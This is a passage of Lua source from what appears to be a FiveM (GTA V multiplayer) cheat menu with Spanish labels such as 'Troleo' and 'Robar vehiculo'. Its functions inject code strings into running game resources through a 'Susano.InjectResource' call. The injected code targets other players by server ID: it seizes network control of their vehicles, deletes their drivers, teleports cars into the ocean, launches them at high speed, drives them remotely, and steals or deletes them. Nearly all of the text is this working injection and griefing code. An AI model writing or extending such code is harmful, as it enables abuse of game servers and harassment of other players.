        SetEntityAsMissionEntity(veh, true, true)
        if NetworkGetEntityIsNetworked(veh) then
            NetworkRequestControlOfEntity(veh)
            local timeout = 0
            while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                NetworkRequestControlOfEntity(veh)
                Wait(10)
                timeout = timeout + 1
            end
        end
        SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
        SetEntityHeading(playerPed, myHeading)
        Wait(100)
    end

    for i = 1, 3 do
        if DoesEntityExist(selectedVehicles[i]) then
            takeControl(selectedVehicles[i])
        end
    end

    local rampPositions = {
        {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
        {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
        {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
    }

    for i = 1, 3 do
        if DoesEntityExist(selectedVehicles[i]) and DoesEntityExist(targetVehicle) then
            local pos = rampPositions[i]
            AttachEntityToEntity(selectedVehicles[i], targetVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
        end
    end

    Wait(500)
    SetEntityVisible(playerPed, true, false)
    SetCamActive(rampCam, false)
    RenderScriptCams(false, false, 0, true, true)
    DestroyCam(rampCam, true)
    if DoesEntityExist(clonePed) then
        DeleteEntity(clonePed)
    end
    SetModelAsNoLongerNeeded(playerModel)
end)
        ]], targetServerId)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

                    Menu.GiveMode = "Vehiculo"

                    function Menu.ActionGive()
                        local giveMode = Menu.GiveMode or "Vehiculo"
                        if giveMode == "Vehiculo" then
                            Menu.ActionGiveVehicle()
                        elseif giveMode == "Rampa" then
                            Menu.ActionGiveRamp()
                        end
                    end

Menu.TPLocation = "oceano"

function Menu.ActionTPTo()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer
    local tpLocation = Menu.TPLocation or "oceano"

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
local targetServerId = %d
local tpLocation = "%s"

local targetPlayerId = nil
for _, player in ipairs(GetActivePlayers()) do
    if GetPlayerServerId(player) == targetServerId then
        targetPlayerId = player
        break
    end
end

if not targetPlayerId then
    return
end

local targetPed = GetPlayerPed(targetPlayerId)
if not DoesEntityExist(targetPed) then
    return
end

if not IsPedInAnyVehicle(targetPed, false) then
    return
end

local targetVehicle = GetVehiclePedIsIn(targetPed, false)
if not DoesEntityExist(targetVehicle) then
    return
end

local locations = {
    oceano = {coords = vector3(-3000.0, -3000.0, 0.0), name = "Oceano"},
    mazebank = {coords = vector3(-75.0, -818.0, 326.0), name = "Maze Bank"},
    ["sandy shores"] = {coords = vector3(1960.0, 3740.0, 32.0), name = "Sandy Shores"}
}

local destCoords = locations[tpLocation].coords
local destName = locations[tpLocation].name

local playerPed = PlayerPedId()
local savedCoords = GetEntityCoords(playerPed)
local savedHeading = GetEntityHeading(playerPed)

local function RequestControl(entity, timeoutMs)
    if not entity or not DoesEntityExist(entity) then return false end
    local start = GetGameTimer()
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        Wait(0)
        if GetGameTimer() - start > (timeoutMs or 500) then
            return false
        end
        NetworkRequestControlOfEntity(entity)
    end
    return true
end

local function tryEnterSeat(seatIndex)
    SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
    Wait(0)
    return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
end

local function getFirstFreeSeat(v)
    local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
    if not numSeats or numSeats <= 0 then return -1 end
    for seat = 0, (numSeats - 2) do
        if IsVehicleSeatFree(v, seat) then return seat end
    end
    return -1
end

ClearPedTasksImmediately(playerPed)
SetVehicleDoorsLocked(targetVehicle, 1)
SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
    TaskLeaveVehicle(playerPed, targetVehicle, 0)
    Wait(500)

    SetEntityCoordsNoOffset(targetVehicle, destCoords.x, destCoords.y, destCoords.z, false, false, false)

    Wait(100)
    SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
    SetEntityHeading(playerPed, savedHeading)

    return
end

if GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
    TaskLeaveVehicle(playerPed, targetVehicle, 0)
    Wait(500)

    SetEntityCoordsNoOffset(targetVehicle, destCoords.x, destCoords.y, destCoords.z, false, false, false)

    Wait(100)
    SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
    SetEntityHeading(playerPed, savedHeading)

    return
end

local fallbackSeat = getFirstFreeSeat(targetVehicle)
if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
    local drv = GetPedInVehicleSeat(targetVehicle, -1)
    if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
        RequestControl(drv, 750)
        ClearPedTasksImmediately(drv)
        SetEntityAsMissionEntity(drv, true, true)
        SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
        Wait(50)
        DeleteEntity(drv)

        for i=1,80 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end
    end

    for attempt = 1, 30 do
        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            Wait(500)

            SetEntityCoordsNoOffset(targetVehicle, destCoords.x, destCoords.y, destCoords.z, false, false, false)

            Wait(100)
            SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
            SetEntityHeading(playerPed, savedHeading)

            return
        end
        Wait(0)
    end
end
        ]], targetServerId, tpLocation)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionWarpVehicle()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
local targetServerId = %d

local targetPlayerId = nil
for _, player in ipairs(GetActivePlayers()) do
    if GetPlayerServerId(player) == targetServerId then
        targetPlayerId = player
        break
    end
end

if not targetPlayerId then
    return
end

local targetPed = GetPlayerPed(targetPlayerId)
if not DoesEntityExist(targetPed) then
    return
end

if not IsPedInAnyVehicle(targetPed, false) then
    return
end

local targetVehicle = GetVehiclePedIsIn(targetPed, false)
if not DoesEntityExist(targetVehicle) then
    return
end

local playerPed = PlayerPedId()

local function RequestControl(entity, timeoutMs)
    if not entity or not DoesEntityExist(entity) then return false end
    local start = GetGameTimer()
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        Wait(0)
        if GetGameTimer() - start > (timeoutMs or 500) then
            return false
        end
        NetworkRequestControlOfEntity(entity)
    end
    return true
end

local function tryEnterSeat(seatIndex)
    SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
    Wait(0)
    return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
end

local function getFirstFreeSeat(v)
    local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
    if not numSeats or numSeats <= 0 then return -1 end
    for seat = 0, (numSeats - 2) do
        if IsVehicleSeatFree(v, seat) then return seat end
    end
    return -1
end

ClearPedTasksImmediately(playerPed)
SetVehicleDoorsLocked(targetVehicle, 1)
SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
    return
end

if GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
    return
end

local fallbackSeat = getFirstFreeSeat(targetVehicle)
if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
    local drv = GetPedInVehicleSeat(targetVehicle, -1)
    if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
        RequestControl(drv, 750)
        ClearPedTasksImmediately(drv)
        SetEntityAsMissionEntity(drv, true, true)
        SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
        Wait(50)
        DeleteEntity(drv)

        for i=1,80 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end
    end

    for attempt = 1, 30 do
        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            return
        end
        Wait(0)
    end
end
        ]], targetServerId)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionWarpBoost()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
CreateThread(function()
    if rawget(_G, 'warp_boost_player_busy') then return end
    rawset(_G, 'warp_boost_player_busy', true)

    local targetServerId = %d

    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
        end
    end

    if not targetPlayerId then
        rawset(_G, 'warp_boost_player_busy', false)
        return
    end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then
        rawset(_G, 'warp_boost_player_busy', false)
        return
    end

    if not IsPedInAnyVehicle(targetPed, false) then
        rawset(_G, 'warp_boost_player_busy', false)
        return
    end

    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    if not DoesEntityExist(targetVehicle) then
        rawset(_G, 'warp_boost_player_busy', false)
        return
    end

    local playerPed = PlayerPedId()
    local initialCoords = GetEntityCoords(playerPed)
    local initialHeading = GetEntityHeading(playerPed)

    local warpBoostCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
    local camCoords = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    SetCamCoord(warpBoostCam, camCoords.x, camCoords.y, camCoords.z)
    SetCamRot(warpBoostCam, camRot.x, camRot.y, camRot.z, 2)
    SetCamFov(warpBoostCam, GetGameplayCamFov())
    SetCamActive(warpBoostCam, true)
    RenderScriptCams(true, false, 0, true, true)

    local playerModel = GetEntityModel(playerPed)
    RequestModel(playerModel)
    local timeout = 0
    while not HasModelLoaded(playerModel) and timeout < 50 do
        Wait(50)
        timeout = timeout + 1
    end

    local groundZ = initialCoords.z
    local rayHandle = StartShapeTestRay(initialCoords.x, initialCoords.y, initialCoords.z + 2.0, initialCoords.x, initialCoords.y, initialCoords.z - 100.0, 1, 0, 0)
    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
    if hit then
        groundZ = hitCoords.z
    end

    local clonePed = CreatePed(4, playerModel, initialCoords.x, initialCoords.y, groundZ, initialHeading, false, false)
    SetEntityCollision(clonePed, false, false)
    FreezeEntityPosition(clonePed, true)
    SetEntityInvincible(clonePed, true)
    SetBlockingOfNonTemporaryEvents(clonePed, true)
    SetPedCanRagdoll(clonePed, false)
    ClonePedToTarget(playerPed, clonePed)

    SetEntityVisible(playerPed, false, false)
    SetEntityLocallyInvisible(playerPed)

    local function RequestControl(entity, timeoutMs)
        if not entity or not DoesEntityExist(entity) then return false end
        local start = GetGameTimer()
        NetworkRequestControlOfEntity(entity)
        while not NetworkHasControlOfEntity(entity) do
            Wait(0)
            if GetGameTimer() - start > (timeoutMs or 500) then
                return false
            end
            NetworkRequestControlOfEntity(entity)
        end
        return true
    end

    RequestControl(targetVehicle, 800)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local function tryEnterSeat(seatIndex)
        SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
        Wait(0)
        return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
    end

    local function getFirstFreeSeat(v)
        local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
        if not numSeats or numSeats <= 0 then return -1 end
        for seat = 0, (numSeats - 2) do
            if IsVehicleSeatFree(v, seat) then return seat end
        end
        return -1
    end

    ClearPedTasksImmediately(playerPed)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local takeoverSuccess = false
    local tStart = GetGameTimer()

    while (GetGameTimer() - tStart) < 1000 do
        RequestControl(targetVehicle, 400)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end

        if not IsPedInVehicle(playerPed, targetVehicle, false) then
            local fs = getFirstFreeSeat(targetVehicle)
            if fs ~= -1 then
                tryEnterSeat(fs)
            end
        end

        local drv = GetPedInVehicleSeat(targetVehicle, -1)
        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
            RequestControl(drv, 400)
            ClearPedTasksImmediately(drv)
            SetEntityAsMissionEntity(drv, true, true)
            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
            Wait(20)
            DeleteEntity(drv)
        end

        local t0 = GetGameTimer()
        while (GetGameTimer() - t0) < 400 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end

        local t1 = GetGameTimer()
        while (GetGameTimer() - t1) < 500 do
            if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                takeoverSuccess = true
                break
            end
            Wait(0)
        end
        if takeoverSuccess then break end
        Wait(0)
    end

    if takeoverSuccess then
        if DoesEntityExist(targetVehicle) then
            FreezeEntityPosition(targetVehicle, true)
            SetVehicleEngineOn(targetVehicle, true, true, false)

            local targetSpeed = 140.0
            for i = 1, 4 do
                SetVehicleForwardSpeed(targetVehicle, targetSpeed)
                Wait(0)
            end
        end
        TaskLeaveVehicle(playerPed, targetVehicle, 0)
        for i = 1, 10 do
            if not IsPedInVehicle(playerPed, targetVehicle, false) then break end
            ClearPedTasksImmediately(playerPed)
            Wait(0)
        end

        SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false)
        SetEntityHeading(playerPed, initialHeading)
        Wait(50)

        if DoesEntityExist(targetVehicle) then
            FreezeEntityPosition(targetVehicle, false)
            NetworkRequestControlOfEntity(targetVehicle)

            CreateThread(function()
                local targetSpeed = 140.0
                for i = 1, 12 do
                    SetVehicleForwardSpeed(targetVehicle, targetSpeed)
                    Wait(0)
                end
            end)
        end
    end

    Wait(500)
    SetEntityVisible(playerPed, true, false)
    SetCamActive(warpBoostCam, false)
    if not rawget(_G, 'isSpectating') then
        RenderScriptCams(false, false, 0, true, true)
    end
    DestroyCam(warpBoostCam, true)
    if DoesEntityExist(clonePed) then
        DeleteEntity(clonePed)
    end
    SetModelAsNoLongerNeeded(playerModel)

    rawset(_G, 'warp_boost_player_busy', false)
end)
        ]], targetServerId)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

                    Menu.WarpMode = "Clasico"

                    function Menu.ActionWarp()
                        local warpMode = Menu.WarpMode or "Clasico"
                        if warpMode == "Clasico" then
                            Menu.ActionWarpVehicle()
                        elseif warpMode == "Aceleron" then
                            Menu.ActionWarpBoost()
                        end
                    end

function Menu.ActionRemoteVehicle()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([=[
CreateThread(function()
    local targetServerId = %d

    local stopFn = rawget(_G, 'remote_vehicle_stop')
    if stopFn and type(stopFn) == 'function' then
        stopFn()
        return
    end

    rawset(_G, 'remote_vehicle_active', true)

    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
        end
    end
    if not targetPlayerId then
        rawset(_G, 'remote_vehicle_active', false)
        return
    end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) or not IsPedInAnyVehicle(targetPed, false) then
        rawset(_G, 'remote_vehicle_active', false)
        return
    end

    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    if not DoesEntityExist(targetVehicle) then
        rawset(_G, 'remote_vehicle_active', false)
        return
    end

    local playerPed = PlayerPedId()
    local initialCoords = GetEntityCoords(playerPed)
    local initialHeading = GetEntityHeading(playerPed)

    local function RequestControl(entity, timeoutMs)
        if not entity or not DoesEntityExist(entity) then return false end
        local start = GetGameTimer()
        NetworkRequestControlOfEntity(entity)
        while not NetworkHasControlOfEntity(entity) do
            Wait(0)
            if GetGameTimer() - start > (timeoutMs or 800) then
                return false
            end
            NetworkRequestControlOfEntity(entity)
        end
        return true
    end

    local function tryEnterSeat(seatIndex)
        SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
        Wait(0)
        return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
    end

    local function getFirstFreeSeat(v)
        local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
        if not numSeats or numSeats <= 0 then return -1 end
        for seat = 0, (numSeats - 2) do
            if IsVehicleSeatFree(v, seat) then return seat end
        end
        return -1
    end

    RequestControl(targetVehicle, 1200)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
    ClearPedTasksImmediately(playerPed)

    local takeoverSuccess = false
    local tStart = GetGameTimer()
    while (GetGameTimer() - tStart) < 1200 do
        RequestControl(targetVehicle, 400)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end

        if not IsPedInVehicle(playerPed, targetVehicle, false) then
            local fs = getFirstFreeSeat(targetVehicle)
            if fs ~= -1 then
                tryEnterSeat(fs)
            end
        end

        local drv = GetPedInVehicleSeat(targetVehicle, -1)
        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
            RequestControl(drv, 400)
            ClearPedTasksImmediately(drv)
            SetEntityAsMissionEntity(drv, true, true)
            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
            Wait(20)
            DeleteEntity(drv)
        end

        local t0 = GetGameTimer()
        while (GetGameTimer() - t0) < 400 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end
        Wait(0)
    end

    if not takeoverSuccess then
        rawset(_G, 'remote_vehicle_active', false)
        return
    end

    TaskLeaveVehicle(playerPed, targetVehicle, 16)
    local leaveT = GetGameTimer()
    while IsPedInVehicle(playerPed, targetVehicle, false) and (GetGameTimer() - leaveT) < 2000 do
        ClearPedTasksImmediately(playerPed)
        Wait(0)
    end

    SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false)
    SetEntityHeading(playerPed, initialHeading)

    local cam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
    SetCamFov(cam, GetGameplayCamFov())
    SetCamActive(cam, true)
    RenderScriptCams(true, false, 0, true, true)

    local running = true
    rawset(_G, 'remote_vehicle_stop', function()
        running = false
    end)

    local throttle = 0.0
    local steerState = 0.0
    local maxSpeed = 22.0

    local yaw = GetEntityHeading(targetVehicle) %% 360.0
    local pitch = 10.0
    local dist = 8.0
    local height = 2.8

    local smoothCamX = 0.0
    local smoothCamY = 0.0
    local smoothCamZ = 0.0

    local function clamp(v, mn, mx)
        if v < mn then return mn end
        if v > mx then return mx end
        return v
    end

    while running do
        Wait(0)

        if not DoesEntityExist(targetVehicle) then
            break
        end

        RequestControl(targetVehicle, 0)
        SetVehicleEngineOn(targetVehicle, true, true, false)

        if IsControlJustPressed(0, 73) then
            break
        end

        DisableControlAction(0, 30, true)
        DisableControlAction(0, 31, true)

        local lookLR = GetControlNormal(0, 1)
        local lookUD = GetControlNormal(0, 2)
        if lookLR ~= 0.0 or lookUD ~= 0.0 then
            yaw = (yaw + (lookLR * 4.5)) %% 360.0
            pitch = clamp(pitch + (lookUD * 3.5), -70.0, 70.0)
        end

        local vehCoords = GetEntityCoords(targetVehicle)
        local yawRad = math.rad(yaw)
        local pitchRad = math.rad(pitch)
        local dirX = math.sin(yawRad)
        local dirY = math.cos(yawRad)
        local cosP = math.cos(pitchRad)
        local sinP = math.sin(pitchRad)

        local targetCamX = vehCoords.x - (dirX * dist * cosP)
        local targetCamY = vehCoords.y - (dirY * dist * cosP)
        local targetCamZ = vehCoords.z + height + (dist * sinP)

        smoothCamX = smoothCamX + (targetCamX - smoothCamX) * 0.15
        smoothCamY = smoothCamY + (targetCamY - smoothCamY) * 0.15
        smoothCamZ = smoothCamZ + (targetCamZ - smoothCamZ) * 0.15

        SetCamCoord(cam, smoothCamX, smoothCamY, smoothCamZ)
        PointCamAtEntity(cam, targetVehicle, 0.0, 0.0, 0.0, true)

        local throttleIn = 0.0
        if IsControlPressed(0, 32) then throttleIn = 1.0 end
        if IsControlPressed(0, 33) then throttleIn = -1.0 end
        throttle = throttle + (throttleIn - throttle) * 0.12

        local trim = 0.0
        if IsControlPressed(0, 34) then trim = trim + 1.0 end
        if IsControlPressed(0, 35) then trim = trim - 1.0 end

        local desiredHeading = yaw
        local vehHeading = GetEntityHeading(targetVehicle)
        local diff = desiredHeading - vehHeading
        while diff > 180.0 do diff = diff - 360.0 end
        while diff < -180.0 do diff = diff + 360.0 end

        local steerIn = (diff / 55.0) + (trim * 0.35)
        if steerIn > 1.0 then steerIn = 1.0 end
        if steerIn < -1.0 then steerIn = -1.0 end
        steerState = steerState + (steerIn - steerState) * 0.16

        SetVehicleSteeringAngle(targetVehicle, steerState * 25.0)

        local speed = GetEntitySpeed(targetVehicle)
        local vel = GetEntityVelocity(targetVehicle)

        local forceMul = 6.0
        local brakeMul = 9.0
        local dragMul = 0.18

        if speed > maxSpeed then
            ApplyForceToEntity(targetVehicle, 1, -vel.x * 0.45, -vel.y * 0.45, 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
        end

        if throttle > 0.05 then
            if speed < maxSpeed then
                ApplyForceToEntity(targetVehicle, 1, dirX * (forceMul * throttle), dirY * (forceMul * throttle), 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
            end
        elseif throttle < -0.05 then
            ApplyForceToEntity(targetVehicle, 1, -dirX * (brakeMul * -throttle), -dirY * (brakeMul * -throttle), 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
        end

        ApplyForceToEntity(targetVehicle, 1, -vel.x * dragMul, -vel.y * dragMul, 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
    end

    rawset(_G, 'remote_vehicle_stop', nil)
    rawset(_G, 'remote_vehicle_active', false)

    SetCamActive(cam, false)
    RenderScriptCams(false, false, 0, true, true)
    DestroyCam(cam, true)
end)
]=], targetServerId)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionStealVehicle()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
CreateThread(function()
    if rawget(_G, 'warp_boost_busy') then return end
    rawset(_G, 'warp_boost_busy', true)

    local targetServerId = %d

    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
    end
end

    if not targetPlayerId then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    if not IsPedInAnyVehicle(targetPed, false) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    if not DoesEntityExist(targetVehicle) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local playerPed = PlayerPedId()
    local initialCoords = GetEntityCoords(playerPed)
    local initialHeading = GetEntityHeading(playerPed)

    local function RequestControl(entity, timeoutMs)
        if not entity or not DoesEntityExist(entity) then return false end
        local start = GetGameTimer()
        NetworkRequestControlOfEntity(entity)
        while not NetworkHasControlOfEntity(entity) do
            Wait(0)
            if GetGameTimer() - start > (timeoutMs or 500) then
                return false
            end
            NetworkRequestControlOfEntity(entity)
        end
        return true
    end

    RequestControl(targetVehicle, 800)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local function tryEnterSeat(seatIndex)
        SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
        Wait(0)
        return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
    end

    local function getFirstFreeSeat(v)
        local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
        if not numSeats or numSeats <= 0 then return -1 end
        for seat = 0, (numSeats - 2) do
            if IsVehicleSeatFree(v, seat) then return seat end
        end
        return -1
    end

    ClearPedTasksImmediately(playerPed)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local takeoverSuccess = false
    local tStart = GetGameTimer()

    while (GetGameTimer() - tStart) < 1000 do
        RequestControl(targetVehicle, 400)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end

        if not IsPedInVehicle(playerPed, targetVehicle, false) then
            local fs = getFirstFreeSeat(targetVehicle)
            if fs ~= -1 then
                tryEnterSeat(fs)
            end
        end

        local drv = GetPedInVehicleSeat(targetVehicle, -1)
        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
            RequestControl(drv, 400)
            ClearPedTasksImmediately(drv)
            SetEntityAsMissionEntity(drv, true, true)
            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
            Wait(20)
            DeleteEntity(drv)
        end

        local t0 = GetGameTimer()
        while (GetGameTimer() - t0) < 400 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end

        local t1 = GetGameTimer()
        while (GetGameTimer() - t1) < 500 do
            if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                takeoverSuccess = true
                break
            end
            Wait(0)
        end
        if takeoverSuccess then break end
        Wait(0)
    end

    if takeoverSuccess then
        if DoesEntityExist(targetVehicle) then
            RequestControl(targetVehicle, 1000)
            SetEntityAsMissionEntity(targetVehicle, true, true)
            DeleteEntity(targetVehicle)

            SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false, false)
            SetEntityHeading(playerPed, initialHeading)
        end
    end

    local dist = #(GetEntityCoords(playerPed) - initialCoords)
    if dist > 10.0 then
        SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false, false)
    end

    rawset(_G, 'warp_boost_busy', false)
end)
        ]], targetServerId)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

do
    Actions.bugPlayerItem = FindItem("En linea", "Troleo", "Bug al jugador")
    if Actions.bugPlayerItem then
        Actions.bugPlayerItem.onClick = function(index, option)
            Menu.BugPlayerMode = option
            Menu.ActionBugPlayer()
    end
end

    Actions.cagePlayerItem = FindItem("En linea", "Troleo", "Enjaular jugador")
    if Actions.cagePlayerItem then
        Actions.cagePlayerItem.onClick = function()
            Menu.ActionCagePlayer()
        end
    end

    Actions.ramPlayerItem = FindItem("En linea", "Troleo", "Embestir")
    if Actions.ramPlayerItem then
        Actions.ramPlayerItem.onClick = function()
            Menu.ActionRamPlayer()
        end
    end

    Actions.crushItem = FindItem("En linea", "Troleo", "Aplastar")
    if Actions.crushItem then
        Actions.crushItem.onClick = function(index, option)
                            Menu.CrushMode = option
            Menu.ActionCrush()
    end
end

    Actions.bugVehicleItem = FindItem("En linea", "Vehiculo", "Bug vehiculo")
    if Actions.bugVehicleItem then
        Actions.bugVehicleItem.onClick = function(index, option)
        if option then
            Menu.BugVehicleMode = option
        end
            Menu.ActionBugVehicle()
    end
end

    Actions.warpItem = FindItem("En linea", "Vehiculo", "Warp")
    if Actions.warpItem then
        Actions.warpItem.onClick = function(index, option)
                            Menu.WarpMode = option
            Menu.ActionWarp()
    end
end

    Actions.remoteVehicleItem = FindItem("En linea", "Vehiculo", "Control remoto")
    if Actions.remoteVehicleItem then
        Actions.remoteVehicleItem.onClick = function()
            Menu.ActionRemoteVehicle()
    end
end

    Actions.stealVehicleItem = FindItem("En linea", "Vehiculo", "Robar vehiculo")
    if Actions.stealVehicleItem then
        Actions.stealVehicleItem.onClick = function()
            Menu.ActionStealVehicle()
    end
end

    Actions.npcDriveItem = FindItem("En linea", "Vehiculo", "Conducir NPC")
    if Actions.npcDriveItem then
        Actions.npcDriveItem.onClick = function()
            Menu.ActionNPCDrive()
        end
    end

    Actions.deleteVehicleItem = FindItem("En linea", "Vehiculo", "Eliminar vehiculo")
    if Actions.deleteVehicleItem then
        Actions.deleteVehicleItem.onClick = function()
            Menu.ActionDeleteVehicle()
        end
    end

    Actions.kickVehicleItem = FindItem("En linea", "Vehiculo", "Expulsar")
    if Actions.kickVehicleItem then
        Actions.kickVehicleItem.onClick = function(index, option)
        if option then
            Menu.KickVehicleMode = option
        end
